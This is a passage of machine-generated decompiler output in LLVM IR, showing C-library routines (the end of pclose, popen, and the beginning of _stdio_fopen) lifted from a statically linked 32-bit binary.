  %v1_80503a9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  %v0_80503ae = load i32, i32* @global_var_8065078.209, align 8
  store i32 %v0_80503ae, i32* @ebx, align 4
  %v1_80503b7 = icmp eq i32 %v0_80503ae, 0
  br i1 %v1_80503b7, label %dec_label_pc_80503ed, label %dec_label_pc_80503bb

dec_label_pc_80503bb:                             ; preds = %entry
  %v1_80503bb = add i32 %v0_80503ae, 4
  %v2_80503bb = inttoptr i32 %v1_80503bb to i32*
  %v3_80503bb = load i32, i32* %v2_80503bb, align 4
  %v4_80503bb = load i32, i32* @edi, align 4
  %v15_80503bb = icmp eq i32 %v3_80503bb, %v4_80503bb
  %v1_80503be = icmp eq i1 %v15_80503bb, false
  br i1 %v1_80503be, label %dec_label_pc_80503dc, label %dec_label_pc_80503c0

dec_label_pc_80503c0:                             ; preds = %dec_label_pc_80503bb
  %v1_80503c0 = inttoptr i32 %v0_80503ae to i32*
  %v2_80503c0 = load i32, i32* %v1_80503c0, align 4
  store i32 %v2_80503c0, i32* @global_var_8065078.209, align 8
  br label %dec_label_pc_80503ed

dec_label_pc_80503c9:                             ; preds = %dec_label_pc_80503dc
  %v0_80503c9 = load i32, i32* %stack_var_-60, align 4
  %v1_80503c9 = call i32 @__errno_location(i32 %v0_80503c9)
  %v1_80503ce = inttoptr i32 %v1_80503c9 to i32*
  store i32 22, i32* %v1_80503ce, align 4
  br label %dec_label_pc_80503ed

dec_label_pc_80503d6:                             ; preds = %dec_label_pc_8050419
  %v3_80503d6 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805043b

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_80503bb, %dec_label_pc_80503e4
  %v1_80503eb = phi i32 [ %v2_80503de, %dec_label_pc_80503e4 ], [ %v0_80503ae, %dec_label_pc_80503bb ]
  %v1_80503de = inttoptr i32 %v1_80503eb to i32*
  %v2_80503de = load i32, i32* %v1_80503de, align 4
  store i32 %v2_80503de, i32* @ebx, align 4
  %v1_80503e0 = icmp eq i32 %v2_80503de, 0
  br i1 %v1_80503e0, label %dec_label_pc_80503c9, label %dec_label_pc_80503e4

dec_label_pc_80503e4:                             ; preds = %dec_label_pc_80503dc
  %v1_80503e4 = add i32 %v2_80503de, 4
  %v2_80503e4 = inttoptr i32 %v1_80503e4 to i32*
  %v3_80503e4 = load i32, i32* %v2_80503e4, align 4
  %v15_80503e4 = icmp eq i32 %v3_80503e4, %v4_80503bb
  %v1_80503e7 = icmp eq i1 %v15_80503e4, false
  br i1 %v1_80503e7, label %dec_label_pc_80503dc, label %dec_label_pc_80503e9

dec_label_pc_80503e9:                             ; preds = %dec_label_pc_80503e4
  %v1_80503e9 = inttoptr i32 %v2_80503de to i32*
  %v2_80503e9 = load i32, i32* %v1_80503e9, align 4
  store i32 %v2_80503e9, i32* %v1_80503de, align 4
  br label %dec_label_pc_80503ed

dec_label_pc_80503ed:                             ; preds = %entry, %dec_label_pc_80503c9, %dec_label_pc_80503c0, %dec_label_pc_80503e9
  store i32 %v2_8050398, i32* %stack_var_-60, align 4
  %v3_80503f6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_80503fe = load i32, i32* @ebx, align 4
  %v1_80503fe = icmp eq i32 %v0_80503fe, 0
  br i1 %v1_80503fe, label %dec_label_pc_8050438, label %dec_label_pc_8050402

dec_label_pc_8050402:                             ; preds = %dec_label_pc_80503ed
  %v1_8050405 = add i32 %v0_80503fe, 8
  %v2_8050405 = inttoptr i32 %v1_8050405 to i32*
  %v3_8050405 = load i32, i32* %v2_8050405, align 4
  store i32 %v3_8050405, i32* @esi, align 4
  store i32 %v0_80503fe, i32* %stack_var_-60, align 4
  %v1_8050409 = call i32 @free(i32 %v0_80503fe)
  %v0_805040e = load i32, i32* @edi, align 4
  store i32 %v0_805040e, i32* %stack_var_-60, align 4
  %v1_8050411 = inttoptr i32 %v0_805040e to i16*
  %v2_8050411 = call i32 @__GI_fclose(i16* %v1_8050411)
  %v2_805041c = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_8050419

dec_label_pc_8050419:                             ; preds = %dec_label_pc_805042e, %dec_label_pc_8050402
  %v0_8050419 = phi i32 [ %v1_805042e, %dec_label_pc_805042e ], [ %v2_8050411, %dec_label_pc_8050402 ]
  %v0_8050421 = load i32, i32* @esi, align 4
  store i32 %v0_8050421, i32* %stack_var_-60, align 4
  %v4_8050422 = call i32 @waitpid(i32 %v0_8050421, i32 %v2_805041c, i32 0, i32 %v0_8050419)
  %v2_805042a = icmp slt i32 %v4_8050422, 0
  %v1_805042c = icmp eq i1 %v2_805042a, false
  br i1 %v1_805042c, label %dec_label_pc_80503d6, label %dec_label_pc_805042e

dec_label_pc_805042e:                             ; preds = %dec_label_pc_8050419
  %v0_805042e = load i32, i32* %stack_var_-60, align 4
  %v1_805042e = call i32 @__errno_location(i32 %v0_805042e)
  %v1_8050433 = inttoptr i32 %v1_805042e to i32*
  %v2_8050433 = load i32, i32* %v1_8050433, align 4
  %v11_8050433 = icmp eq i32 %v2_8050433, 4
  br i1 %v11_8050433, label %dec_label_pc_8050419, label %dec_label_pc_8050438.loopexit

dec_label_pc_8050438.loopexit:                    ; preds = %dec_label_pc_805042e
  br label %dec_label_pc_8050438

dec_label_pc_8050438:                             ; preds = %dec_label_pc_8050438.loopexit, %dec_label_pc_80503ed
  br label %dec_label_pc_805043b

dec_label_pc_805043b:                             ; preds = %dec_label_pc_80503d6, %dec_label_pc_8050438
  %storemerge = phi i32 [ -1, %dec_label_pc_8050438 ], [ %v3_80503d6, %dec_label_pc_80503d6 ]
  %v2_805043e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805043e, i32* @ebx, align 4
  store i32 %v0_8050384, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805042e, { 1, 0 }
  uselistorder i32 %v0_80503fe, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80503de, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @waitpid, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_805043b, { 1, 0 }
  uselistorder label %dec_label_pc_80503ed, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80503dc, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050442 = load i32, i32* @esi, align 4
  %v0_8050443 = load i32, i32* @ebx, align 4
  store i32 %v0_8050443, i32* %stack_var_-8, align 4
  %v15_8050444 = ptrtoint i32* %stack_var_-60 to i32
  %v4_8050447 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050447, i32* @ebx, align 4
  %v2_805044b = load i8, i8* %arg2, align 1
  %v3_805044b = zext i8 %v2_805044b to i32
  %v4_805044b = load i32, i32* @eax, align 4
  %v5_805044b = and i32 %v4_805044b, -256
  %v6_805044b = or i32 %v5_805044b, %v3_805044b
  store i32 %v6_805044b, i32* %eax.global-to-local, align 4
  %v10_805044d = icmp eq i8 %v2_805044b, 119
  br i1 %v10_805044d, label %dec_label_pc_805047c, label %dec_label_pc_8050451

dec_label_pc_8050451:                             ; preds = %entry
  %v10_8050459 = icmp eq i8 %v2_805044b, 114
  br i1 %v10_8050459, label %dec_label_pc_805047c, label %dec_label_pc_805045d

dec_label_pc_805045d:                             ; preds = %dec_label_pc_8050451
  %v1_805045d = call i32 @__errno_location(i32 1)
  store i32 %v1_805045d, i32* %eax.global-to-local, align 4
  %v1_8050462 = inttoptr i32 %v1_805045d to i32*
  store i32 22, i32* %v1_8050462, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050633

dec_label_pc_805047c:                             ; preds = %entry, %dec_label_pc_8050451
  %v0_805054a = phi i32 [ 1, %dec_label_pc_8050451 ], [ 0, %entry ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_8050481 = call i32 @malloc(i32 12)
  store i32 %v1_8050481, i32* %eax.global-to-local, align 4
  %v1_805048d = icmp eq i32 %v1_8050481, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_805048d, label %dec_label_pc_8050633, label %dec_label_pc_805049c

dec_label_pc_805049c:                             ; preds = %dec_label_pc_805047c
  %v2_805049f = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_805049f, i32* %eax.global-to-local, align 4
  store i32 %v2_805049f, i32* %stack_var_-76, align 4
  %v1_80504a4 = call i32 @__GI_pipe(i32 %v2_805049f)
  store i32 %v1_80504a4, i32* %eax.global-to-local, align 4
  %v1_80504ac = icmp eq i32 %v1_80504a4, 0
  %v1_80504ae = icmp eq i1 %v1_80504ac, false
  br i1 %v1_80504ae, label %dec_label_pc_805061c, label %dec_label_pc_80504b4

dec_label_pc_80504b4:                             ; preds = %dec_label_pc_805049c
  store i32 %v0_805054a, i32* %eax.global-to-local, align 4
  %tmp38 = sub nsw i32 0, %v0_805054a
  %v2_80504b8 = and i32 %tmp38, 4
  %v3_80504b8 = add i32 %v15_8050444, 44
  %v4_80504b8 = add i32 %v3_80504b8, %v2_80504b8
  %v5_80504b8 = inttoptr i32 %v4_80504b8 to i32*
  %v6_80504b8 = load i32, i32* %v5_80504b8, align 4
  %v5_80504c5 = xor i32 %v0_805054a, 1
  store i32 %v5_80504c5, i32* %eax.global-to-local, align 4
  %tmp39 = sub nsw i32 0, %v5_80504c5
  %v2_80504c9 = and i32 %tmp39, 4
  %v4_80504c9 = add i32 %v3_80504b8, %v2_80504c9
  %v5_80504c9 = inttoptr i32 %v4_80504c9 to i32*
  %v6_80504c9 = load i32, i32* %v5_80504c9, align 4
  store i32 %v6_80504c9, i32* %eax.global-to-local, align 4
  %v0_80504d1 = load i32, i32* @ecx, align 4
  %v0_80504d3 = load i32, i32* @ebx, align 4
  %v5_80504d3 = inttoptr i32 %v0_80504d3 to i8*
  store i8* %v5_80504d3, i8** %stack_var_-72, align 4
  store i32 %v6_80504c9, i32* %stack_var_-76, align 4
  %v5_80504d5 = call i32 @fdopen(i32 %v6_80504c9, i32 %v0_80504d3, i32 %v0_80504d1, i32 %v0_80504d1)
  store i32 %v5_80504d5, i32* %eax.global-to-local, align 4
  store i32 %v5_80504d5, i32* %stack_var_-60, align 4
  %v1_80504e1 = icmp eq i32 %v5_80504d5, 0
  %v1_80504e3 = icmp eq i1 %v1_80504e1, false
  br i1 %v1_80504e3, label %dec_label_pc_8050500, label %dec_label_pc_80504e5

dec_label_pc_80504e5:                             ; preds = %dec_label_pc_80504b4
  store i32 %v6_80504c9, i32* %stack_var_-76, align 4
  %v1_80504ec = call i32 @__libc_close(i32 %v6_80504c9)
  store i32 %v1_80504ec, i32* %eax.global-to-local, align 4
  %v2_80504f1 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80504f1, i32* %edx.global-to-local, align 4
  store i32 %v6_80504b8, i32* %stack_var_-76, align 4
  %v1_80504f6 = call i32 @__libc_close(i32 %v6_80504b8)
  br label %dec_label_pc_8050619

dec_label_pc_8050500:                             ; preds = %dec_label_pc_80504b4
  store i8* inttoptr (i32 134540701 to i8*), i8** %stack_var_-72, align 4
  %v2_805050b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805050b, i32* %eax.global-to-local, align 4
  store i32 %v2_805050b, i32* %stack_var_-76, align 4
  %v5_8050510 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  store i32 %v5_8050510, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8065060.208 to i32), i32* %stack_var_-76, align 4
  %v1_805051c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  store i32 %v1_805051c, i32* %eax.global-to-local, align 4
  %v0_8050521 = load i32, i32* %stack_var_-76, align 4
  %v1_8050521 = call i32 @__vfork(i32 %v0_8050521)
  store i32 %v1_8050521, i32* %eax.global-to-local, align 4
  store i32 %v1_8050521, i32* @ebx, align 4
  %v1_805052b = icmp eq i32 %v1_8050521, 0
  %v1_805052d = icmp eq i1 %v1_805052b, false
  br i1 %v1_805052d, label %dec_label_pc_80505a7, label %dec_label_pc_805052f

dec_label_pc_805052f:                             ; preds = %dec_label_pc_8050500
  store i32 %v6_80504c9, i32* %stack_var_-76, align 4
  %v1_8050536 = call i32 @__libc_close(i32 %v6_80504c9)
  store i32 %v1_8050536, i32* %eax.global-to-local, align 4
  store i32 %v0_805054a, i32* %edx.global-to-local, align 4
  %v15_8050542 = icmp eq i32 %v6_80504b8, %v0_805054a
  br i1 %v15_8050542, label %dec_label_pc_8050561, label %dec_label_pc_8050548

dec_label_pc_8050548:                             ; preds = %dec_label_pc_805052f
  %v5_805054a = inttoptr i32 %v0_805054a to i8*
  store i8* %v5_805054a, i8** %stack_var_-72, align 4
  store i32 %v6_80504b8, i32* %stack_var_-76, align 4
  %v5_805054f = call i32 @dup2(i32 %v6_80504b8, i32 %v0_805054a, i32 %v1_8050536, i32 %v1_8050536)
  %v2_8050554 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050554, i32* %eax.global-to-local, align 4
  store i32 %v6_80504b8, i32* %stack_var_-76, align 4
  %v1_8050559 = call i32 @__libc_close(i32 %v6_80504b8)
  store i32 %v1_8050559, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050561

dec_label_pc_8050561:                             ; preds = %dec_label_pc_805052f, %dec_label_pc_8050548
  %v0_8050561 = load i32, i32* @global_var_8065078.209, align 8
  store i32 %v0_8050561, i32* @ebx, align 4
  %v1_805057c3 = icmp eq i32 %v0_8050561, 0
  %v1_805057e10 = icmp eq i1 %v1_805057c3, false
  br i1 %v1_805057e10, label %dec_label_pc_8050569, label %dec_label_pc_8050580

dec_label_pc_8050569:                             ; preds = %dec_label_pc_8050561, %dec_label_pc_8050569
  %v0_8050569 = phi i32 [ %v2_8050577, %dec_label_pc_8050569 ], [ %v0_8050561, %dec_label_pc_8050561 ]
  %v1_8050569 = add i32 %v0_8050569, 4
  %v2_8050569 = inttoptr i32 %v1_8050569 to i32*
  %v3_8050569 = load i32, i32* %v2_8050569, align 4
  store i32 %v3_8050569, i32* %eax.global-to-local, align 4
  %v1_805056f = add i32 %v3_8050569, 4
  %v2_805056f = inttoptr i32 %v1_805056f to i32*
  %v3_805056f = load i32, i32* %v2_805056f, align 4
  store i32 %v3_805056f, i32* %stack_var_-76, align 4
  %v1_8050572 = call i32 @__libc_close(i32 %v3_805056f)
  store i32 %v1_8050572, i32* %eax.global-to-local, align 4
  %v0_8050577 = load i32, i32* @ebx, align 4
  %v1_8050577 = inttoptr i32 %v0_8050577 to i32*
  %v2_8050577 = load i32, i32* %v1_8050577, align 4
  store i32 %v2_8050577, i32* @ebx, align 4
  %v1_805057c = icmp eq i32 %v2_8050577, 0
  %v1_805057e = icmp eq i1 %v1_805057c, false
  br i1 %v1_805057e, label %dec_label_pc_8050569, label %dec_label_pc_8050580

dec_label_pc_8050580:                             ; preds = %dec_label_pc_8050569, %dec_label_pc_8050561
  store i32 0, i32* %stack_var_-76, align 4
  %v8_8050598 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805b503.212 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b508.211 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b500.210 to i32), i32 %arg1, i32 0)
  store i32 %v8_8050598, i32* %eax.global-to-local, align 4
  store i32 127, i32* %stack_var_-76, align 4
  %v1_80505a2 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80505a7:                             ; preds = %dec_label_pc_8050500
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805050b, i32* %stack_var_-76, align 4
  %v4_80505b0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_80505b5 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80505b5, i32* %eax.global-to-local, align 4
  store i32 %v6_80504b8, i32* %stack_var_-76, align 4
  %v1_80505ba = call i32 @__libc_close(i32 %v6_80504b8)
  store i32 %v1_80505ba, i32* %eax.global-to-local, align 4
  %v0_80505c2 = load i32, i32* @ebx, align 4
  %tmp41 = icmp slt i32 %v0_80505c2, 1
  br i1 %tmp41, label %dec_label_pc_805060d, label %dec_label_pc_80505c6

dec_label_pc_80505c6:                             ; preds = %dec_label_pc_80505a7
  store i32 %v1_8050481, i32* %eax.global-to-local, align 4
  %v2_80505ca = add i32 %v1_8050481, 8
  %v3_80505ca = inttoptr i32 %v2_80505ca to i32*
  store i32 %v0_80505c2, i32* %v3_80505ca, align 4
  %v2_80505cd = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_80505cd, i32* %edx.global-to-local, align 4
  %v1_80505d0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80505d0 = add i32 %v1_80505d0, 4
  %v3_80505d0 = inttoptr i32 %v2_80505d0 to i32*
  store i32 %v2_80505cd, i32* %v3_80505d0, align 4
  store i8* inttoptr (i32 134540701 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805050b, i32* %stack_var_-76, align 4
  %v5_80505df = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  store i32 %v5_80505df, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8065060.208 to i32), i32* %stack_var_-76, align 4
  %v1_80505eb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065060.208 to i32))
  store i32 %v1_8050481, i32* %edx.global-to-local, align 4
  %v0_80505f4 = load i32, i32* @global_var_8065078.209, align 8
  store i32 %v0_80505f4, i32* %eax.global-to-local, align 4
  %v2_80505f9 = inttoptr i32 %v1_8050481 to i32*
  store i32 %v0_80505f4, i32* %v2_80505f9, align 4
  %v0_80505fb = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80505fb, i32* @global_var_8065078.209, align 8
  %v2_8050601 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050601, i32* @ecx, align 4
  %v2_8050602 = load i8*, i8** %stack_var_-72, align 4
  %v3_8050602 = ptrtoint i8* %v2_8050602 to i32
  store i32 %v3_8050602, i32* @ebx, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805050b, i32* %stack_var_-76, align 4
  %v4_8050606 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v4_8050606, i32* %eax.global-to-local, align 4
  %v2_8050633.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050630

dec_label_pc_805060d:                             ; preds = %dec_label_pc_80505a7
  %v3_8050610 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_8050610, i32* %stack_var_-76, align 4
  %v1_8050614 = inttoptr i32 %v3_8050610 to i16*
  %v2_8050614 = call i32 @__GI_fclose(i16* %v1_8050614)
  br label %dec_label_pc_8050619

dec_label_pc_8050619:                             ; preds = %dec_label_pc_80504e5, %dec_label_pc_805060d
  %storemerge = phi i32 [ %v2_8050614, %dec_label_pc_805060d ], [ %v1_80504f6, %dec_label_pc_80504e5 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805061c

dec_label_pc_805061c:                             ; preds = %dec_label_pc_805049c, %dec_label_pc_8050619
  store i32 %v1_8050481, i32* %stack_var_-76, align 4
  %v1_8050623 = call i32 @free(i32 %v1_8050481)
  store i32 %v1_8050623, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050630

dec_label_pc_8050630:                             ; preds = %dec_label_pc_80505c6, %dec_label_pc_805061c
  %v2_8050633.pre = phi i32 [ %v2_8050633.pre.pre, %dec_label_pc_80505c6 ], [ 0, %dec_label_pc_805061c ]
  br label %dec_label_pc_8050633

dec_label_pc_8050633:                             ; preds = %dec_label_pc_805047c, %dec_label_pc_805045d, %dec_label_pc_8050630
  %v2_8050633 = phi i32 [ 0, %dec_label_pc_805047c ], [ 0, %dec_label_pc_805045d ], [ %v2_8050633.pre, %dec_label_pc_8050630 ]
  store i32 %v2_8050633, i32* %eax.global-to-local, align 4
  %v2_8050639 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050639, i32* @ebx, align 4
  store i32 %v0_8050442, i32* @esi, align 4
  ret i32 %v2_8050633

; uselistorder directives
  uselistorder i32 %v2_8050633, { 1, 0 }
  uselistorder i32 %v0_80505c2, { 1, 0 }
  uselistorder i32 %v2_8050577, { 1, 2, 0 }
  uselistorder i32 %v1_8050521, { 1, 0, 2 }
  uselistorder i32 %v6_80504c9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v6_80504b8, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_805049f, { 1, 0, 2 }
  uselistorder i32 %v1_8050481, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder i32 %v0_805054a, { 2, 1, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i8** %stack_var_-72, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 ptrtoint (i32* @global_var_8065060.208 to i32), { 3, 6, 2, 4, 7, 0, 5, 8, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050633, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050630, { 1, 0 }
  uselistorder label %dec_label_pc_805061c, { 1, 0 }
  uselistorder label %dec_label_pc_8050619, { 1, 0 }
  uselistorder label %dec_label_pc_8050569, { 1, 0 }
  uselistorder label %dec_label_pc_8050561, { 1, 0 }
  uselistorder label %dec_label_pc_805047c, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805063c = load i32, i32* @ebp, align 4
  %v0_805063d = load i32, i32* @edi, align 4
  %v0_805063e = load i32, i32* @esi, align 4
  %v0_805063f = load i32, i32* @ebx, align 4
  store i32 %v0_805063f, i32* %stack_var_-16, align 4
  %v4_8050643 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050643, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050653 = load i8, i8* %arg2, align 1
  %v3_8050653 = zext i8 %v2_8050653 to i32
  %v4_8050653 = load i32, i32* @eax, align 4
  %v5_8050653 = and i32 %v4_8050653, -256
  %v6_8050653 = or i32 %v5_8050653, %v3_8050653
  store i32 %v6_8050653, i32* %eax.global-to-local, align 4
  %v10_8050655 = icmp eq i8 %v2_8050653, 114
  br i1 %v10_8050655, label %dec_label_pc_8050697, label %dec_label_pc_8050659

dec_label_pc_8050659:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_805065e = icmp eq i8 %v2_8050653, 119
  br i1 %v10_805065e, label %dec_label_pc_8050699, label %dec_label_pc_8050662

dec_label_pc_8050662:                             ; preds = %dec_label_pc_8050659
  store i32 1089, i32* @ebx, align 4
  %v10_8050666 = icmp eq i8 %v2_8050653, 97
  br i1 %v10_8050666, label %dec_label_pc_8050699, label %dec_label_pc_805066a

dec_label_pc_805066a:                             ; preds = %dec_label_pc_8050712, %dec_label_pc_80506ec, %dec_label_pc_8050662
  %v0_805066a = load i32, i32* %stack_var_-16, align 4
  %v1_805066a = call i32 @__errno_location(i32 %v0_805066a)
  store i32 %v1_805066a, i32* %eax.global-to-local, align 4
  %v0_805066f = load i32, i32* @ebp, align 4
  %v1_805066f = icmp eq i32 %v0_805066f, 0
  %v1_8050671 = inttoptr i32 %v1_805066a to i32*
  store i32 22, i32* %v1_8050671, align 4
  br i1 %v1_805066f, label %dec_label_pc_805085f, label %dec_label_pc_805067d

dec_label_pc_805067d:                             ; preds = %dec_label_pc_805073b, %dec_label_pc_805066a
  %v0_805067d = load i32, i32* @ebp, align 4
  %v1_805067d = add i32 %v0_805067d, 1
  %v2_805067d = inttoptr i32 %v1_805067d to i8*
  %v3_805067d = load i8, i8* %v2_805067d, align 1
  %v4_805067d = and i8 %v3_805067d, 32
  %v5_805067d = icmp eq i8 %v4_805067d, 0
  br i1 %v5_805067d, label %dec_label_pc_805085f, label %dec_label_pc_8050687

dec_label_pc_8050687:                             ; preds = %dec_label_pc_805067d
  store i32 %v0_805067d, i32* %stack_var_-76, align 4
  %v1_805068b = call i32 @free(i32 %v0_805067d)
  store i32 %v1_805068b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805085a

dec_label_pc_8050697:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050699

dec_label_pc_8050699:                             ; preds = %dec_label_pc_8050662, %dec_label_pc_8050659, %dec_label_pc_8050697
  %v0_80506aa = phi i32 [ 1089, %dec_label_pc_8050662 ], [ 577, %dec_label_pc_8050659 ], [ 1, %dec_label_pc_8050697 ]
  %v1_8050699 = add i32 %v4_8050643, 1
  store i32 %v1_8050699, i32* %eax.global-to-local, align 4
  %v2_805069c = inttoptr i32 %v1_8050699 to i8*
  %v3_805069c = load i8, i8* %v2_805069c, align 1
  %v12_805069c = icmp eq i8 %v3_805069c, 98
  br i1 %v12_805069c, label %dec_label_pc_80506a4, label %dec_label_pc_80506a2

dec_label_pc_80506a2:                             ; preds = %dec_label_pc_8050699
  store i32 %v4_8050643, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506a4

dec_label_pc_80506a4:                             ; preds = %dec_label_pc_8050699, %dec_label_pc_80506a2
  %v0_80506a4 = phi i32 [ %v1_8050699, %dec_label_pc_8050699 ], [ %v4_8050643, %dec_label_pc_80506a2 ]
  %v1_80506a4 = add i32 %v0_80506a4, 1
  %v2_80506a4 = inttoptr i32 %v1_80506a4 to i8*
  %v3_80506a4 = load i8, i8* %v2_80506a4, align 1
  %v12_80506a4 = icmp eq i8 %v3_80506a4, 43
  %v1_80506a8 = icmp eq i1 %v12_80506a4, false
  br i1 %v1_80506a8, label %dec_label_pc_80506b2, label %dec_label_pc_80506aa

dec_label_pc_80506aa:                             ; preds = %dec_label_pc_80506a4
  store i32 %v0_80506aa, i32* %eax.global-to-local, align 4
  %v1_80506af = add nuw nsw i32 %v0_80506aa, 1
  store i32 %v1_80506af, i32* @ebx, align 4
  br label %dec_label_pc_80506b2

dec_label_pc_80506b2:                             ; preds = %dec_label_pc_80506a4, %dec_label_pc_80506aa
  %v1_80506b2 = icmp eq i32 %arg3, 0
  %v1_80506b4 = icmp eq i1 %v1_80506b2, false
  br i1 %v1_80506b4, label %dec_label_pc_80506e8, label %dec_label_pc_80506b6

dec_label_pc_80506b6:                             ; preds = %dec_label_pc_80506b2
  store i32 80, i32* %stack_var_-76, align 4
  %v1_80506bb = call i32 @malloc(i32 80)
  store i32 %v1_80506bb, i32* %eax.global-to-local, align 4
  store i32 %v1_80506bb, i32* @ebp, align 4
  %v2_80506c5 = icmp eq i32 %v1_80506bb, 0
  br i1 %v2_80506c5, label %dec_label_pc_8050861, label %dec_label_pc_80506cd

dec_label_pc_80506cd:                             ; preds = %dec_label_pc_80506b6
  %v2_80506bb = inttoptr i32 %v1_80506bb to i16*
  store i16 8192, i16* %v2_80506bb, align 2
  %v2_80506d5 = add i32 %v1_80506bb, 8
  %v3_80506d5 = inttoptr i32 %v2_80506d5 to i32*
  store i32 0, i32* %v3_80506d5, align 4
  %v2_80506dc = add i32 %v1_80506bb, 56
  store i32 %v2_80506dc, i32* %eax.global-to-local, align 4
  store i32 %v2_80506dc, i32* %stack_var_-76, align 4
  %v1_80506e0 = call i32 @__stdio_init_mutex(i32 %v2_80506dc)
  store i32 %v1_80506e0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506e8

dec_label_pc_80506e8:                             ; preds = %dec_label_pc_80506b2, %dec_label_pc_80506cd
  %v2_80506e8 = icmp slt i32 %arg4, 0
  br i1 %v2_80506e8, label %dec_label_pc_8050735, label %dec_label_pc_80506ec

dec_label_pc_80506ec:                             ; preds = %dec_label_pc_80506e8
  %v0_80506ec = load i32, i32* @ebx, align 4
  %v0_80506ee = load i32, i32* @esi, align 4
  %v1_80506ee = add i32 %v0_80506ee, 1
  store i32 %v1_80506ee, i32* %eax.global-to-local, align 4
